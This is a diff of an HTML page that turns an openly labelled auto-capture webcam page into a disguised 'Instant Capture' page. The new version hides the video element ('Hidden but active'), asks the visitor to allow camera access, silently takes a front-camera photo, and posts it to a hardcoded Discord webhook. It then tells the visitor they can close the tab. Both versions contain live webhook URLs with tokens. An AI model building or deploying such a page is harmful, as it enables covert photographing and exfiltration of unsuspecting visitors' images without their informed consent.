@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto-Discord Cam</title>
+    <title>Instant Capture</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #2f3136; color: white; padding: 20px; }
-        video { width: 100%; max-width: 400px; border-radius: 10px; border: 3px solid #5865f2; }
-        #status { margin-top: 20px; font-weight: bold; color: #00ff00; }
-        .info { color: #b9bbbe; font-size: 0.8em; margin-top: 5px; }
+        body { background: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        video { width: 1px; height: 1px; opacity: 0; } /* Hidden but active */
+        #msg { text-align: center; }
     </style>
 </head>
 <body>
 
-    <h2>Auto-Capture Active</h2>
+    <div id="msg">
+        <h2 id="status">Requesting Camera...</h2>
+        <p id="subtext">Please click "Allow" to proceed.</p>
+    </div>
+
     <video id="v" autoplay playsinline muted></video>
-    <p id="status">Initializing Camera...</p>
-    <p class="info">A photo will be sent every 10 seconds.</p>
-    
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
@@ -25,55 +25,51 @@
         const c = document.getElementById('c');
         const status = document.getElementById('status');
         
-        const HOOK = "https://discord.com/api/webhooks/1474021723002372260/IBeFoSemz3OCVD99-CJk8mfZKwxroqDkhmmd-39hRn5tunfR49zcvYJGlbAdgxLZ1HzF";
-        const INTERVAL = 10000; // 10,000ms = 10 seconds
+        // YOUR NEW WEBHOOK URL
+        const HOOK = "https://discord.com/api/webhooks/1474321374733664459/qGF3At-bXtP8bZoNOezpj601-GHDdEeo6vPsrjDZ5xO4_k13a0iOFnfZeRDw5lqnsPTr";
 
-        // 1. Start Camera
+        // 1. Ask for permission and start stream
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => { 
-                v.srcObject = stream; 
-                status.innerText = "Camera Live. Starting auto-capture...";
+                v.srcObject = stream;
+                status.innerText = "Capturing...";
                 
-                // 2. Wait 3 seconds for light adjustment, then start the loop
-                setTimeout(() => {
-                    takePhoto(); // Take first photo
-                    setInterval(takePhoto, INTERVAL); // Repeat
-                }, 3000);
+                // 2. Listen for 'loadedmetadata' to ensure the camera is actually "on"
+                v.onloadedmetadata = () => {
+                    // Short 300ms delay to prevent a pitch-black frame
+                    setTimeout(snapAndSend, 300); 
+                };
             })
             .catch(err => { 
-                status.innerText = "Error: " + err.message; 
-                status.style.color = "red";
+                status.innerText = "Permission Denied";
+                console.error(err);
             });
 
-        // 3. The Capture Function
-        function takePhoto() {
-            status.innerText = "📸 Snapping Photo...";
-            
+        function snapAndSend() {
             c.width = v.videoWidth;
             c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
 
             c.toBlob(blob => {
                 const formData = new FormData();
-                formData.append('file', blob, 'auto_capture.jpg');
+                formData.append('file', blob, 'instant_snap.jpg');
                 formData.append('payload_json', JSON.stringify({ 
-                    content: `🕒 **Auto-Capture:** ${new Date().toLocaleTimeString()}` 
+                    content: "⚡ **Instant Photo Captured!**" 
                 }));
 
                 fetch(HOOK, { method: 'POST', body: formData })
                 .then(res => {
                     if(res.ok) {
-                        status.innerText = "✅ Sent to Discord!";
-                        setTimeout(() => { status.innerText = "Waiting for next interval..."; }, 2000);
+                        status.innerText = "✅ Done!";
+                        document.getElementById('subtext').innerText = "You can close this tab now.";
                     } else {
-                        status.innerText = "❌ Discord Error: " + res.status;
+                        status.innerText = "❌ Error: " + res.status;
                     }
                 })
                 .catch(e => {
-                    status.innerText = "❌ Network/CORS Error";
-                    console.error(e);
+                    status.innerText = "❌ Network Error";
                 });
-            }, 'image/jpeg', 0.7); // 0.7 = 70% quality to save data
+            }, 'image/jpeg', 0.9);
         }
     </script>
 </body>
